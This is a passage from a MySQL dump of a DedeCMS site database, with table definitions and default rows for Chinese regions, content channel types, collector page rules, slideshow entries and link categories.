六盘水市',26,0),(2603,'遵义市',26,0),(2604,'安顺市',26,0),(2605,'铜仁地区',26,0),(2606,'毕节地区',26,0),(2607,'黔西南州',26,0),(2608,'黔东南州',26,0),(2609,'黔南州',26,0),(27,'西藏区',0,0),(2701,'拉萨市',27,0),(2702,'那曲地区',27,0),(2703,'昌都地区',27,0),(2704,'山南地区',27,0),(2705,'日喀则',27,0),(2706,'阿里地区',27,0),(2707,'林芝地区',27,0),(28,'甘肃省',0,0),(2801,'兰州市',28,0),(2802,'金昌市',28,0),(2803,'白银市',28,0),(2804,'天水市',28,0),(2805,'嘉峪关市',28,0),(2806,'武威市',28,0),(2807,'定西地区',28,0),(2808,'平凉地区',28,0),(2809,'庆阳地区',28,0),(2810,'陇南地区',28,0),(2811,'张掖地区',28,0),(2812,'酒泉地区',28,0),(2813,'甘南州',28,0),(2814,'临夏州',28,0),(29,'宁夏区',0,0),(2901,'银川市',29,0),(2902,'石嘴山市',29,0),(2903,'吴忠市',29,0),(2904,'固原市',29,0),(30,'青海省',0,0),(3001,'西宁市',30,0),(3002,'海东地区',30,0),(3003,'海北州',30,0),(3004,'黄南州',30,0),(3005,'海南州',30,0),(3006,'果洛州',30,0),(3007,'玉树州',30,0),(3008,'海西州',30,0),(31,'新疆区',0,0),(3101,'乌鲁木齐',31,0),(3102,'克拉玛依',31,0),(3103,'石河子市',31,0),(3104,'吐鲁番',31,0),(3105,'哈密地区',31,0),(3106,'和田地区',31,0),(3107,'阿克苏',31,0),(3108,'喀什地区',31,0),(3109,'克孜勒苏',31,0),(3110,'巴音郭楞',31,0),(3111,'昌吉州',31,0),(3112,'博尔塔拉',31,0),(3113,'伊犁州',31,0),(3117,'东城区',1,0),(32,'香港区',0,0),(33,'澳门区',0,0),(35,'台湾省',0,0);
/*!40000 ALTER TABLE `dede_area` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_channeltype`
--

DROP TABLE IF EXISTS `dede_channeltype`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_channeltype` (
  `id` smallint(6) NOT NULL DEFAULT '0',
  `nid` varchar(20) NOT NULL DEFAULT '',
  `typename` varchar(30) NOT NULL DEFAULT '',
  `maintable` varchar(50) NOT NULL DEFAULT 'dede_archives',
  `addtable` varchar(50) NOT NULL DEFAULT '',
  `addcon` varchar(30) NOT NULL DEFAULT '',
  `mancon` varchar(30) NOT NULL DEFAULT '',
  `editcon` varchar(30) NOT NULL DEFAULT '',
  `useraddcon` varchar(30) NOT NULL DEFAULT '',
  `usermancon` varchar(30) NOT NULL DEFAULT '',
  `usereditcon` varchar(30) NOT NULL DEFAULT '',
  `fieldset` text,
  `listfields` text,
  `allfields` text,
  `issystem` smallint(6) NOT NULL DEFAULT '0',
  `isshow` smallint(6) NOT NULL DEFAULT '1',
  `issend` smallint(6) NOT NULL DEFAULT '0',
  `arcsta` smallint(6) NOT NULL DEFAULT '-1',
  `usertype` char(10) NOT NULL DEFAULT '',
  `sendrank` smallint(6) NOT NULL DEFAULT '10',
  `isdefault` smallint(6) NOT NULL DEFAULT '0',
  `needdes` tinyint(1) NOT NULL DEFAULT '1',
  `needpic` tinyint(1) NOT NULL DEFAULT '1',
  `titlename` varchar(20) NOT NULL DEFAULT '标题',
  `onlyone` smallint(6) NOT NULL DEFAULT '0',
  `dfcid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `nid` (`nid`,`isshow`,`arcsta`,`sendrank`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_channeltype`
--

LOCK TABLES `dede_channeltype` WRITE;
/*!40000 ALTER TABLE `dede_channeltype` DISABLE KEYS */;
INSERT INTO `dede_channeltype` VALUES (1,'article','普通文章','dede_archives','dede_addonarticle','article_add.php','content_list.php','article_edit.php','article_add.php','content_list.php','article_edit.php','<field:body itemname=\"文章内容\" autofield=\"0\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"\" page=\"split\">	\n</field:body>	\n','','',1,1,1,-1,'',10,0,1,1,'标题',0,0),(2,'image','图片集','dede_archives','dede_addonimages','album_add.php','content_i_list.php','album_edit.php','album_add.php','content_list.php','album_edit.php','<field:pagestyle itemname=\"页面风格\" type=\"number\" isnull=\"true\" default=\"2\" rename=\"\" notsend=\"1\" />	\n<field:imgurls itemname=\"图片集合\" type=\"img\" isnull=\"true\" default=\"\" rename=\"\" page=\"split\"/>	\n<field:body itemname=\"图集内容\" autofield=\"0\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\"></field:body>','','',1,1,1,-1,'',10,0,1,1,'标题',0,0),(3,'soft','软件','dede_archives','dede_addonsoft','soft_add.php','content_i_list.php','soft_edit.php','','','','<field:filetype islist=\"1\" itemname=\"文件类型\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:language islist=\"1\" itemname=\"语言\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:softtype islist=\"1\" itemname=\"软件类型\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:accredit islist=\"1\" itemname=\"授权方式\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:os islist=\"1\" itemname=\"操作系统\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:softrank  islist=\"1\" itemname=\"软件等级\" type=\"int\" isnull=\"true\" default=\"3\" rename=\"\" function=\"GetRankStar(@me)\" notsend=\"1\"/>	\n<field:officialUrl  itemname=\"官方网址\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:officialDemo itemname=\"演示网址\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:softsize  itemname=\"软件大小\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:softlinks  itemname=\"软件地址\" type=\"softlinks\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:introduce  itemname=\"详细介绍\" type=\"htmltext\" isnull=\"trnue\" default=\"\" rename=\"\" />	\n<field:daccess islist=\"1\" itemname=\"下载级别\" type=\"int\" isnull=\"true\" default=\"0\" rename=\"\" function=\"\" notsend=\"1\"/>	\n<field:needmoney islist=\"1\" itemname=\"需要金币\" type=\"int\" isnull=\"true\" default=\"0\" rename=\"\" function=\"\" notsend=\"1\" />','filetype,language,softtype,os,accredit,softrank','',1,1,1,-1,'',10,0,1,1,'标题',0,0),(-1,'spec','专题','dede_archives','dede_addonspec','spec_add.php','content_s_list.php','spec_edit.php','','','','<field:note type=\"specialtopic\" isnull=\"true\" default=\"\" rename=\"\"/>','','',1,1,0,-1,'',10,0,1,1,'标题',0,0),(6,'shop','商品','dede_archives','dede_addonshop','archives_add.php','content_list.php','archives_edit.php','archives_add.php','content_list.php','archives_edit.php','<field:body itemname=\"详细介绍\" autofield=\"1\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"\" page=\"split\">	\n</field:body>	\n<field:price itemname=\"市场价\" autofield=\"1\" notsend=\"0\" type=\"float\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"\" page=\"\">	\n</field:price>	\n<field:trueprice itemname=\"优惠价\" autofield=\"1\" notsend=\"0\" type=\"float\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"\" page=\"\">	\n</field:trueprice>	\n<field:brand itemname=\"品牌\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:brand>	\n<field:units itemname=\"计量单位\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:units>	\n\n	\n\n<field:vocation itemname=\"行业\" autofield=\"1\" notsend=\"0\"type=\"stepselect\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:vocation>	\n\n<field:infotype itemname=\"信息类型\" autofield=\"1\" notsend=\"0\" type=\"stepselect\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:infotype>	\n\n<field:uptime itemname=\"上架时间\" autofield=\"1\" notsend=\"0\" type=\"datetime\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:uptime>	\n','price,trueprice,brand,units','',0,1,1,-1,'',10,0,1,1,'商品名称',0,0),(-8,'infos','分类信息','dede_archives','dede_addoninfos','archives_sg_add.php','content_sg_list.php','archives_sg_edit.php','archives_sg_add.php','content_sg_list.php','archives_sg_edit.php','<field:channel itemname=\"频道id\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"10\" page=\"\"></field:channel>	\n<field:arcrank itemname=\"浏览权限\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"5\" page=\"\"></field:arcrank>	\n<field:mid itemname=\"会员id\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"8\" page=\"\"></field:mid>	\n<field:click itemname=\"点击\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"10\" page=\"\"></field:click>	\n<field:title itemname=\"标题\" autofield=\"0\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"60\" page=\"\"></field:title>	\n<field:senddate itemname=\"发布时间\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"10\" page=\"\"></field:senddate>	\n<field:flag itemname=\"推荐属性\" autofield=\"0\" notsend=\"0\" type=\"checkbox\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"10\" page=\"\"></field:flag>	\n<field:litpic itemname=\"缩略图\" autofield=\"0\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"60\" page=\"\"></field:litpic>	\n<field:userip itemname=\"会员IP\" autofield=\"0\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"0\" default=\"0\"  maxlength=\"15\" page=\"\"></field:userip>	\n<field:lastpost itemname=\"最后评论时间\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"10\" page=\"\"></field:lastpost>	\n<field:scores itemname=\"评论积分\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"8\" page=\"\"></field:scores>	\n<field:goodpost itemname=\"好评数\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"8\" page=\"\"></field:goodpost>	\n<field:badpost itemname=\"差评数\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"8\" page=\"\"></field:badpost>	\n<field:nativeplace itemname=\"地区\" autofield=\"1\" notsend=\"0\" type=\"stepselect\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"250\" page=\"\">	\n</field:nativeplace>	\n<field:infotype itemname=\"信息类型\" autofield=\"1\" notsend=\"0\" type=\"stepselect\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"250\" page=\"\">	\n</field:infotype>	\n<field:body itemname=\"信息内容\" autofield=\"1\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:body>	\n<field:endtime itemname=\"截止日期\" autofield=\"1\" notsend=\"0\" type=\"datetime\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:endtime>	\n<field:linkman itemname=\"联系人\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"50\" page=\"\">	\n</field:linkman>	\n<field:tel itemname=\"联系电话\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"0\" default=\"\" maxlength=\"50\" page=\"\">	\n</field:tel>	\n<field:email itemname=\"电子邮箱\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"50\" page=\"\">	\n</field:email>	\n<field:address itemname=\"地址\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"100\" page=\"\">	\n</field:address>	\n','channel,arcrank,mid,click,title,senddate,flag,litpic,lastpost,scores,goodpost,badpost,nativeplace,infotype,endtime','',-1,1,1,-1,'',0,0,0,1,'信息标题',0,0);
/*!40000 ALTER TABLE `dede_channeltype` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_co_htmls`
--

DROP TABLE IF EXISTS `dede_co_htmls`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_co_htmls` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `nid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `title` varchar(60) NOT NULL DEFAULT '',
  `litpic` varchar(100) NOT NULL DEFAULT '',
  `url` varchar(100) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `isdown` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `isexport` tinyint(1) NOT NULL DEFAULT '0',
  `result` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `nid` (`nid`),
  KEY `typeid` (`typeid`,`title`,`url`,`dtime`,`isdown`,`isexport`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_co_htmls`
--

LOCK TABLES `dede_co_htmls` WRITE;
/*!40000 ALTER TABLE `dede_co_htmls` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_co_htmls` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_co_mediaurls`
--

DROP TABLE IF EXISTS `dede_co_mediaurls`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_co_mediaurls` (
  `nid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `hash` char(32) NOT NULL DEFAULT '',
  `tofile` char(60) NOT NULL DEFAULT '',
  KEY `hash` (`hash`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_co_mediaurls`
--

LOCK TABLES `dede_co_mediaurls` WRITE;
/*!40000 ALTER TABLE `dede_co_mediaurls` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_co_mediaurls` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_co_note`
--

DROP TABLE IF EXISTS `dede_co_note`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_co_note` (
  `nid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `channelid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `notename` varchar(50) NOT NULL DEFAULT '',
  `sourcelang` varchar(10) NOT NULL DEFAULT 'gb2312',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `cotime` int(10) unsigned NOT NULL DEFAULT '0',
  `pnum` smallint(5) unsigned NOT NULL DEFAULT '0',
  `isok` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `usemore` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `listconfig` text,
  `itemconfig` text,
  PRIMARY KEY (`nid`),
  KEY `isok` (`isok`,`channelid`,`cotime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_co_note`
--

LOCK TABLES `dede_co_note` WRITE;
/*!40000 ALTER TABLE `dede_co_note` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_co_note` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_co_onepage`
--

DROP TABLE IF EXISTS `dede_co_onepage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_co_onepage` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(60) NOT NULL DEFAULT '',
  `title` varchar(60) NOT NULL DEFAULT '',
  `issource` smallint(6) NOT NULL DEFAULT '1',
  `lang` varchar(10) NOT NULL DEFAULT 'gb2312',
  `rule` text,
  PRIMARY KEY (`id`),
  KEY `url` (`url`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_co_onepage`
--

LOCK TABLES `dede_co_onepage` WRITE;
/*!40000 ALTER TABLE `dede_co_onepage` DISABLE KEYS */;
INSERT INTO `dede_co_onepage` VALUES (5,'www.dedecms.com','织梦网络',1,'gb2312','<div class=\"content\">{@body}<div class=\"cupage\">'),(4,'www.techweb.com.cn','Techweb',1,'gb2312','<div class=\"content_txt\">{@body}</div>	\n'),(6,'tw.news.yahoo.com','台湾雅虎',1,'big5','<div id=\"ynwsartcontent\">{@body}</div>	\n');
/*!40000 ALTER TABLE `dede_co_onepage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_co_urls`
--

DROP TABLE IF EXISTS `dede_co_urls`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_co_urls` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `hash` varchar(32) NOT NULL DEFAULT '',
  `nid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_co_urls`
--

LOCK TABLES `dede_co_urls` WRITE;
/*!40000 ALTER TABLE `dede_co_urls` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_co_urls` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_diyforms`
--

DROP TABLE IF EXISTS `dede_diyforms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_diyforms` (
  `diyid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL DEFAULT '',
  `posttemplate` varchar(50) NOT NULL,
  `viewtemplate` varchar(50) NOT NULL,
  `listtemplate` varchar(50) NOT NULL,
  `table` varchar(50) NOT NULL DEFAULT '',
  `info` text,
  `public` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`diyid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_diyforms`
--

LOCK TABLES `dede_diyforms` WRITE;
/*!40000 ALTER TABLE `dede_diyforms` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_diyforms` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_dl_log`
--

DROP TABLE IF EXISTS `dede_dl_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_dl_log` (
  `id` mediumint(10) unsigned NOT NULL AUTO_INCREMENT,
  `ip` char(16) NOT NULL,
  `lang` char(6) NOT NULL,
  `dtype` varchar(10) NOT NULL,
  `dltime` int(10) unsigned NOT NULL DEFAULT '0',
  `referrer` varchar(255) NOT NULL DEFAULT '',
  `user_agent` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `dltime` (`dltime`),
  KEY `dl_ip` (`ip`,`dltime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_dl_log`
--

LOCK TABLES `dede_dl_log` WRITE;
/*!40000 ALTER TABLE `dede_dl_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_dl_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_downloads`
--

DROP TABLE IF EXISTS `dede_downloads`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_downloads` (
  `hash` char(32) NOT NULL,
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `downloads` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`hash`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_downloads`
--

LOCK TABLES `dede_downloads` WRITE;
/*!40000 ALTER TABLE `dede_downloads` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_downloads` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_erradd`
--

DROP TABLE IF EXISTS `dede_erradd`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_erradd` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `aid` mediumint(8) unsigned NOT NULL,
  `mid` mediumint(8) unsigned DEFAULT NULL,
  `title` char(60) NOT NULL DEFAULT '',
  `type` smallint(6) NOT NULL DEFAULT '0',
  `errtxt` mediumtext,
  `oktxt` mediumtext,
  `sendtime` int(10) unsigned NOT NULL DEFAULT '0',
  KEY `id` (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_erradd`
--

LOCK TABLES `dede_erradd` WRITE;
/*!40000 ALTER TABLE `dede_erradd` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_erradd` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_feedback`
--

DROP TABLE IF EXISTS `dede_feedback`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_feedback` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `username` char(20) NOT NULL DEFAULT '',
  `arctitle` varchar(60) NOT NULL DEFAULT '',
  `ip` char(15) NOT NULL DEFAULT '',
  `ischeck` smallint(6) NOT NULL DEFAULT '0',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `bad` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `good` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ftype` set('feedback','good','bad') NOT NULL DEFAULT 'feedback',
  `face` smallint(5) unsigned NOT NULL DEFAULT '0',
  `msg` text,
  PRIMARY KEY (`id`),
  KEY `aid` (`aid`,`ischeck`,`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_feedback`
--

LOCK TABLES `dede_feedback` WRITE;
/*!40000 ALTER TABLE `dede_feedback` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_feedback` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_flash`
--

DROP TABLE IF EXISTS `dede_flash`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_flash` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `title` varchar(60) NOT NULL DEFAULT '',
  `litpic` varchar(255) NOT NULL DEFAULT '',
  `litimg` varchar(255) NOT NULL DEFAULT '',
  `content` varchar(255) NOT NULL DEFAULT '',
  `arcurl` varchar(255) NOT NULL DEFAULT '',
  `sortrank` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `sortrank` (`sortrank`,`typeid`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_flash`
--

LOCK TABLES `dede_flash` WRITE;
/*!40000 ALTER TABLE `dede_flash` DISABLE KEYS */;
INSERT INTO `dede_flash` VALUES (6,1,'2','/uploads/190222/1903/1-1Z30H14535U7.jpg','/uploads/190222/1903/1-1Z30H2235BC.jpg','','',0),(5,1,'幻灯测试','/uploads/allimg/1902/1-1Z22H220550-L.jpg','/uploads/allimg/1902/1-1Z22H224260-L.jpg','','http://www.zzhqxx.com/index.html',1);
/*!40000 ALTER TABLE `dede_flash` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_flashtype`
--

DROP TABLE IF EXISTS `dede_flashtype`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_flashtype` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typename` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_flashtype`
--

LOCK TABLES `dede_flashtype` WRITE;
/*!40000 ALTER TABLE `dede_flashtype` DISABLE KEYS */;
INSERT INTO `dede_flashtype` VALUES (1,'1');
/*!40000 ALTER TABLE `dede_flashtype` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_flink`
--

DROP TABLE IF EXISTS `dede_flink`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_flink` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `sortrank` smallint(6) NOT NULL DEFAULT '0',
  `url` char(60) NOT NULL DEFAULT '',
  `webname` char(30) NOT NULL DEFAULT '',
  `msg` char(200) NOT NULL DEFAULT '',
  `email` char(50) NOT NULL DEFAULT '',
  `logo` char(60) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ischeck` smallint(6) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_flink`
--

LOCK TABLES `dede_flink` WRITE;
/*!40000 ALTER TABLE `dede_flink` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_flink` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_flinktype`
--

DROP TABLE IF EXISTS `dede_flinktype`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_flinktype` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typename` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_flinktype`
--

LOCK TABLES `dede_flinktype` WRITE;
/*!40000 ALTER TABLE `dede_flinktype` DISABLE KEYS */;
INSERT INTO `dede_flinktype` VALUES (1,'综合网站'),(2,'娱乐类'),(3,'教育类'),(4,'计算机类'),(5,'电子商务'),(6,'网上信息'),(7,'论坛类'),(8,'其它类型');
/*!40000 ALTER TABLE `dede_flinktype` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_freelist`
--

DROP TABLE IF EXISTS `dede_freelist`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_freelist` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(50) NOT NULL DEFAULT '',
  `namerule` varchar(50) NOT NULL DEFAULT '',
  `listdir` varchar(60) NOT NULL DEFAULT '',
  `defaultpage` varchar(20) NOT NULL DEFAULT '',
  `nodefault` smallint(6) NOT NULL DEFAULT '0',
  `templet` varchar(50) NOT NULL DEFAULT '',
  `edtime` int(11) NOT NULL DEFAULT '0',
  `maxpage` smallint(5) unsigned NOT NULL DEFAULT '100',
  `click` int(11) NOT NULL DEFAULT '1',
  `listtag` mediumtext,
  `keywords` varchar(100) NOT NULL DEFAULT '',
  `description` varchar(250) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_freelist`
--

LOCK TABLES `dede_freelist` WRITE;
/*!40000 ALTER TABLE `dede_freelist` DISABLE KEYS */;
